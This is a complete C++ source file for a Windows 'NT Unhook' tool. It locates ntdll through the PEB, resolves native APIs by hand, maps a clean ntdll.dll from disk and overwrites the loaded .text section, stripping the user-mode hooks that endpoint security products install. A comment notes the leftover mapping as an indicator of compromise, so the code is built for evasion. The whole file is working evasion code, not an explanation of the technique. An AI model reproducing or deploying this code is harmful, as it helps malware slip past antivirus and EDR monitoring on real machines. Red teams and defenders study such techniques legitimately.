#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY_CUSTOM, * PLDR_DATA_TABLE_ENTRY_CUSTOM;

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* pNtOpenFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions
    );

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
    );

typedef BOOL(WINAPI* pIsWow64Process)(
    HANDLE ProcessHandle,
    PBOOL Wow64Process
    );

namespace ntdll {

    PVOID VxMoveMemory(
        PVOID Dest,
        const PVOID Src,
        SIZE_T Len
    ) {
        char* D = (char*)Dest;
        const char* S = (const char*)Src;
        while (Len--)
            *D++ = *S++;
        return Dest;
    }

    int VxCompareMemory(
        const PVOID Ptr1,
        const PVOID Ptr2,
        SIZE_T Len
    ) {
        const unsigned char* P1 = (const unsigned char*)Ptr1;
        const unsigned char* P2 = (const unsigned char*)Ptr2;
        while (Len--) {
            if (*P1 != *P2)
                return *P1 - *P2;
            P1++;
            P2++;
        }
        return 0;
    }

    PVOID GetModuleHandleCustom(
        const WCHAR* ModuleName
    ) {
#ifdef _WIN64
        PEB* Peb = (PEB*)__readgsqword(0x60);
#else
        PEB* Peb = (PEB*)__readfsdword(0x30);
#endif
        LIST_ENTRY* Head = &Peb->Ldr->InMemoryOrderModuleList;

        for (LIST_ENTRY* Entry = Head->Flink; Entry != Head; Entry = Entry->Flink) {
            LDR_DATA_TABLE_ENTRY_CUSTOM* Ldr = CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
            if (Ldr->BaseDllName.Buffer && ModuleName) {
                if (_wcsicmp(Ldr->BaseDllName.Buffer, ModuleName) == 0) {
                    return Ldr->DllBase;
                }
            }
        }
        return NULL;
    }

    PVOID GetProcAddressCustom(
        PVOID ModuleBase,
        const char* FunctionName
    ) {
        if (!ModuleBase || !FunctionName) return NULL;

        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
        if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ModuleBase + DosHeader->e_lfanew);
        if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

        DWORD ExportRva = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!ExportRva) return NULL;

        PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ModuleBase + ExportRva);
        DWORD* FunctionTable = (DWORD*)((BYTE*)ModuleBase + ExportDir->AddressOfFunctions);
        DWORD* NameTable = (DWORD*)((BYTE*)ModuleBase + ExportDir->AddressOfNames);
        WORD* OrdinalTable = (WORD*)((BYTE*)ModuleBase + ExportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < ExportDir->NumberOfNames; i++) {
            char* CurrentName = (char*)((BYTE*)ModuleBase + NameTable[i]);
            if (strcmp(CurrentName, FunctionName) == 0) {
                WORD Ordinal = OrdinalTable[i];
                DWORD FunctionRva = FunctionTable[Ordinal];
                return (PVOID)((BYTE*)ModuleBase + FunctionRva);
            }
        }
        return NULL;
    }

    BOOL VirtualProtectCustom(
        PVOID Address,
        SIZE_T Size,
        ULONG NewProtect,
        PULONG OldProtect
    ) {
        HMODULE HNtdll = (HMODULE)GetModuleHandleCustom(L"ntdll.dll");
        if (!HNtdll)
            return FALSE;

        pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddressCustom(HNtdll, "NtProtectVirtualMemory");
        if (!NtProtectVirtualMemory)
            return FALSE;

        PVOID BaseAddr = Address;
        SIZE_T RegionSize = Size;

        NTSTATUS Status = NtProtectVirtualMemory((HANDLE)-1, &BaseAddr, &RegionSize, NewProtect, OldProtect);

        if (!NT_SUCCESS(Status)) {
            printf("[-] NtProtectVirtualMemory failed with status: 0x%X\n", Status);
            return FALSE;
        }

        return TRUE;
    }

    BYTE* CopyProtectedMemory(
        LPVOID TargetAddr,
        DWORD CopySize,
        DWORD* OutSize
    ) {
        if (TargetAddr == NULL || CopySize == 0) {
            *OutSize = 0;
            return NULL;
        }

        ULONG OldProtection;
        if (!VirtualProtectCustom(TargetAddr, CopySize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
            printf("[-] CopyProtectedMemory: VirtualProtectCustom failed\n");
            *OutSize = 0;
            return NULL;
        }

        BYTE* Buffer = (BYTE*)malloc(CopySize);
        if (!Buffer) {
            VirtualProtectCustom(TargetAddr, CopySize, OldProtection, &OldProtection);
            *OutSize = 0;
            return NULL;
        }

        __try {
            VxMoveMemory(Buffer, TargetAddr, CopySize);
            VirtualProtectCustom(TargetAddr, CopySize, OldProtection, &OldProtection);
            *OutSize = CopySize;
            return Buffer;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] CopyProtectedMemory: Exception during memory copy\n");
            free(Buffer);
            VirtualProtectCustom(TargetAddr, CopySize, OldProtection, &OldProtection);
           *OutSize = 0;
            return NULL;
        }
    }

    BOOL WriteProtectedMemory(
        LPVOID TargetAddr,
        BYTE* SourceData,
        DWORD WriteSize
    ) {
        if (TargetAddr == NULL || SourceData == NULL || WriteSize == 0) {
            printf("[-] WriteProtectedMemory: Invalid parameters\n");
            return FALSE;
        }

        ULONG OldProtection;
        if (!VirtualProtectCustom(TargetAddr, WriteSize, PAGE_EXECUTE_READWRITE, &OldProtection)) {
            printf("[-] WriteProtectedMemory: Failed to change protection to RWX\n");
            return FALSE;
        }

        __try {
            VxMoveMemory(TargetAddr, SourceData, WriteSize);
            if (!VirtualProtectCustom(TargetAddr, WriteSize, OldProtection, &OldProtection)) {
                printf("[-] WriteProtectedMemory: Failed to restore original protection\n");
                return FALSE;
            }
            return TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] WriteProtectedMemory: Exception during memory write\n");
            VirtualProtectCustom(TargetAddr, WriteSize, OldProtection, &OldProtection);
            return FALSE;
        }
    }

    BOOL Unhook() {
        printf("[+] NTDLL unhook start\n");

        HMODULE HNtdll = (HMODULE)GetModuleHandleCustom(L"ntdll.dll");
        if (!HNtdll) {
            printf("[-] Module lookup failed\n");
            return FALSE;
        }
        printf("[*] ntdll base -> 0x%p\n", HNtdll);

        HMODULE HKernel32 = (HMODULE)GetModuleHandleCustom(L"kernel32.dll");
        pIsWow64Process IsWow64Process = (pIsWow64Process)GetProcAddressCustom(HKernel32, "IsWow64Process");

        BOOL Wow64 = FALSE;
        if (IsWow64Process) {
            IsWow64Process((HANDLE)-1, &Wow64);
        }

        WCHAR SystemDir[MAX_PATH];
        if (Wow64 && sizeof(LPVOID) == 4) {
            wcscpy_s(SystemDir, MAX_PATH, L"C:\\Windows\\SysWOW64\\");
        }
        else {
            wcscpy_s(SystemDir, MAX_PATH, L"C:\\Windows\\System32\\");
        }

        WCHAR DllPath[MAX_PATH];
        wcscpy_s(DllPath, MAX_PATH, SystemDir);
        wcscat_s(DllPath, MAX_PATH, L"ntdll.dll");

        printf("[*] DLL path -> %ws\n", DllPath);

        pNtOpenFile NtOpenFile = (pNtOpenFile)GetProcAddressCustom(HNtdll, "NtOpenFile");
        pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressCustom(HNtdll, "NtCreateSection");
        pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressCustom(HNtdll, "NtMapViewOfSection");
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddressCustom(HNtdll, "NtUnmapViewOfSection");
        pNtClose NtClose = (pNtClose)GetProcAddressCustom(HNtdll, "NtClose");

        if (!NtOpenFile || !NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection || !NtClose) {
            printf("[-] NT API resolve failed\n");
            return FALSE;
        }

        printf("[*] NtOpenFile -> 0x%p\n", NtOpenFile);
        printf("[*] NtCreateSection -> 0x%p\n", NtCreateSection);
        printf("[*] NtMapViewOfSection -> 0x%p\n", NtMapViewOfSection);
        printf("[*] NtUnmapViewOfSection -> 0x%p\n", NtUnmapViewOfSection);

        UNICODE_STRING FilePath;
        WCHAR PathBuffer[MAX_PATH];
        wcscpy_s(PathBuffer, MAX_PATH, L"\\??\\");
        wcscat_s(PathBuffer, MAX_PATH, DllPath);

        FilePath.Buffer = PathBuffer;
        FilePath.Length = (USHORT)(wcslen(PathBuffer) * sizeof(WCHAR));
        FilePath.MaximumLength = FilePath.Length + sizeof(WCHAR);

        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES), 0, &FilePath, 0x40, NULL, NULL };
        IO_STATUS_BLOCK IoStatus;
        HANDLE HFile = NULL;

        NTSTATUS Status = NtOpenFile(&HFile, FILE_GENERIC_READ, &ObjAttr, &IoStatus, FILE_SHARE_READ, 0);
        if (!NT_SUCCESS(Status)) {
            printf("[-] NtOpenFile status -> 0x%X\n", Status);
            return FALSE;
        }
        printf("[*] File handle -> 0x%p\n", HFile);

        HANDLE HSection = NULL;
        Status = NtCreateSection(&HSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, HFile);
        NtClose(HFile);

        if (!NT_SUCCESS(Status)) {
            printf("[-] NtCreateSection status -> 0x%X\n", Status);
            return FALSE;
        }
        printf("[*] Section handle -> 0x%p\n", HSection);

        PVOID CleanBase = NULL;
        SIZE_T ViewSize = 0;
        Status = NtMapViewOfSection(HSection, (HANDLE)-1, &CleanBase, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
        NtClose(HSection);

        if (!NT_SUCCESS(Status)) {
            printf("[-] NtMapViewOfSection status -> 0x%X\n", Status);
            return FALSE;
        }
        printf("[*] Clean mapped -> 0x%p\n", CleanBase);
        printf("[*] View size -> 0x%zX\n", ViewSize);

        PIMAGE_DOS_HEADER DosHdr = (PIMAGE_DOS_HEADER)HNtdll;
        PIMAGE_NT_HEADERS NtHdrs = (PIMAGE_NT_HEADERS)((BYTE*)HNtdll + DosHdr->e_lfanew);

        SHORT NumberOfSections = NtHdrs->FileHeader.NumberOfSections;
        SHORT SizeOfOptionalHeader = NtHdrs->FileHeader.SizeOfOptionalHeader;

        printf("[*] Number of sections -> %d\n", NumberOfSections);
        printf("[*] Size of optional header -> 0x%X\n", SizeOfOptionalHeader);

        BOOL Found = FALSE;
        BOOL Success = FALSE;

        for (SHORT i = 0; i < NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER SectHdr = (PIMAGE_SECTION_HEADER)((BYTE*)HNtdll + DosHdr->e_lfanew + 0x18 + SizeOfOptionalHeader + i * 0x28);

            if (SectHdr->Name[0] == '.' &&
                SectHdr->Name[1] == 't' &&
                SectHdr->Name[2] == 'e' &&
                SectHdr->Name[3] == 'x' &&
                SectHdr->Name[4] == 't') {

                Found = TRUE;
                DWORD VirtualAddress = SectHdr->VirtualAddress;
                DWORD VirtualSize = SectHdr->Misc.VirtualSize;

                PVOID HookedAddr = (BYTE*)HNtdll + VirtualAddress;
                PVOID CleanAddr = (BYTE*)CleanBase + VirtualAddress;

                printf("[*] .text section found\n");
                printf("[*] .text hooked -> 0x%p\n", HookedAddr);
                printf("[*] .text clean -> 0x%p\n", CleanAddr);
                printf("[*] .text size -> 0x%X bytes\n", VirtualSize);

                DWORD BackupSize = 0;
                BYTE* BackupBuffer = CopyProtectedMemory(HookedAddr, VirtualSize, &BackupSize);
                if (BackupBuffer && BackupSize == VirtualSize) {
                    printf("[*] Backup created -> %u bytes\n", BackupSize);

                    int PreCompare = VxCompareMemory(BackupBuffer, CleanAddr, VirtualSize);
                    if (PreCompare == 0) {
                        printf("[*] Pre-unhook: sections identical (no hooks detected)\n");
                    }
                    else {
                        printf("[*] Pre-unhook: sections differ (hooks likely present)\n");
                    }
                }
                else {
                    printf("[-] Failed to create backup for verification\n");
                }

                printf("[*] Attempting to unhook .text section...\n");
                if (WriteProtectedMemory(HookedAddr, (BYTE*)CleanAddr, VirtualSize)) {
                    printf("[+] Memory write complete -> %u bytes\n", VirtualSize);

                    DWORD VerifySize = 0;
                    BYTE* VerifyBuffer = CopyProtectedMemory(HookedAddr, VirtualSize, &VerifySize);
                    if (VerifyBuffer && VerifySize == VirtualSize) {
                        int PostCompare = VxCompareMemory(VerifyBuffer, CleanAddr, VirtualSize);
                        if (PostCompare == 0) {
                            printf("[+] Verification: .text matches clean copy\n");
                            printf("[+] Unhook verified successful\n");
                            Success = TRUE;
                        }
                        else {
                            printf("[-] Verification: .text differs from clean copy\n");
                            printf("[-] Unhook may have failed\n");
                        }
                        free(VerifyBuffer);
                    }
                    else {
                        printf("[-] Failed to verify unhook\n");
                    }
                }
                else {
                    printf("[-] WriteProtectedMemory failed\n");
                }

                if (BackupBuffer) free(BackupBuffer);
                break;
            }
        }

        printf("[*] Unmapping clean copy...\n");
        Status = NtUnmapViewOfSection((HANDLE)-1, CleanBase);
        if (NT_SUCCESS(Status)) {
            printf("[*] Clean copy unmapped successfully\n");
        }
        else {
            printf("[-] Failed to unmap clean copy (status: 0x%X)\n", Status);
            printf("[-] WARNING: Second NTDLL copy may still be loaded (IOC)\n");
        }

        if (!Found) {
            printf("[-] .text section not found\n");
            return FALSE;
        }

        if (Success) {
            printf("[+] Unhook complete\n");
        }
        else {
            printf("[-] Unhook failed or could not be verified\n");
        }

        return Success;
    }
}

int main() {
    printf("=== NT Unhook ===\n");
    printf("[*] Handle: -1 (GetCurrentProcess)\n");
#ifdef _WIN64
    printf("[*] Arch: x64\n\n");
#else
    printf("[*] Arch: x86\n\n");
#endif

    BOOL result = ntdll::Unhook();

    if (result) {
        printf("\n[*] Unhooking succeeded\n");
    }
    else {
        printf("\n[*] Unhooking failed\n");
    }

    printf("[*] Press Enter to exit...\n");
    getchar();
    return result ? 0 : 1;
}